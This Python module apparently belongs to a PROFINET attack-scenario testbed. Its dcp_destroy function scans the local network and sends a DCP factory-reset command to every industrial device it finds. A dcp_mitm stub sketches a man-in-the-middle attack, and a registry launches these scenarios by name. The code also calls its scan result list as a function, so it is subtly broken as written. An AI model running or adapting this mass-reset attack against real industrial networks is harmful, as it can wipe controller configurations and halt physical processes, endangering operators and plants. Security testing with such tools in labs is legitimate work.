
import src.attacks.discovery as d

from pnio_dcp import DCP
from src.config_loader import Scenario

from src.constants import INTERFACE
TIMEOUT = 10


def dcp_destroy():


    interface = INTERFACE
    network, ip = d.get_local_network(interface)
    s_ip = str(ip)

    pnet_devs = d.dcp_scan(s_ip, TIMEOUT)

    dcp = DCP(ip=s_ip)

    for dev in pnet_devs():
        DCP.reset_to_factory(dcp, dev.get("mac"))




def find_device_by_ip(devices: list[dict], ip: str) -> dict | None:
    for device in devices:
        if device["ip"] == ip:
            return device
    return None


def dcp_mitm(device:str, controller:str):
    interface = INTERFACE
    network, ip = d.get_local_network(interface)
    pnet_devs = d.dcp_scan(ip, TIMEOUT)
    dcp = DCP(ip=ip)

    dev = find_device_by_ip(pnet_devs, device)



def nothing():
    print("Nothing")

from collections.abc import Callable


_ATTACKS: dict[str, Callable[[dict], None]] = {
    "dcp-destroy": dcp_destroy,
    "nothing": nothing,
}


def start_scenario(cfg: Scenario) -> None:
    func = _ATTACKS.get(cfg.name)
    if func is None:
        raise ValueError(f"Unknown scenario: {cfg.name!r}")
    func(**cfg.params)

